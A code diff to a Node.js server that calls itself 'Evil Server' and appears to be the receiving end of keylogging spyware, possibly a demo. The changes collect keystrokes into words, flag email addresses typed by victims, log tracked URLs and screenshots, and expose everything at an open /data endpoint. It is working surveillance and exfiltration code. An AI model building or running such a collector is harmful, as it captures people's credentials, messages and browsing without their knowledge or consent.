@@ -7,6 +7,7 @@ const options = {
 console.log("**** Evil Server ****");
 console.log("*** MuHAHAHAHAHAHAHAHAA ***");
 
+let content = [];
 const getBodyJson = (body) => {
   try {
     return JSON.parse(body);
@@ -21,6 +22,14 @@ https
     response.setHeader("Access-Control-Allow-Origin", "*");
     response.setHeader("Access-Control-Allow-Methods", "OPTIONS, GET, POST");
     response.setHeader("Access-Control-Max-Age", 2592000); // 30 days
+    console.log("Request received: ", request.method, request.url);
+    if (request.method === "GET" && request.url === "/data") {
+      // Respond with the usage information
+      console.log("GET request");
+      response.writeHead(200, { "Content-Type": "application/json" });
+      response.end(JSON.stringify(content));
+    }
+
     let body = [];
     request
       .on("data", (chunk) => {
@@ -33,10 +42,17 @@ https
         console.log(strBody);
 
         const jsonBody = getBodyJson(strBody);
+        if (jsonBody.type === "evil-track") {
+          content.push({ type: "url", content: jsonBody.url });
+        }
+        if (jsonBody.type === "report-site") {
+          content.push({ type: "reportedSite", content: jsonBody.url });
+        }
         if (jsonBody.type === "key") {
           const letter = jsonBody.key;
           word += letter;
-          if (letter === " ") {
+          if (letter === " " || letter === "Enter" || letter === "Tab") {
+            content.push({ type: "word", content: word });
             if (word.indexOf("@") > -1) {
               console.warn("🎺 email found: " + word + " 🎺");
             }
@@ -49,6 +65,7 @@ https
           const htmlWithImage = `<html><body><h1>Hacked Image - ${new Date().toDateString()}</h1><img src="${
             jsonBody.content
           }" /></body></html>`;
+          content.push({ type: "screenshot", content: jsonBody.content });
           fs.writeFile(imageName, htmlWithImage, function (err) {
             if (err) throw err;
             console.log("=== Image saved: ", imageName);
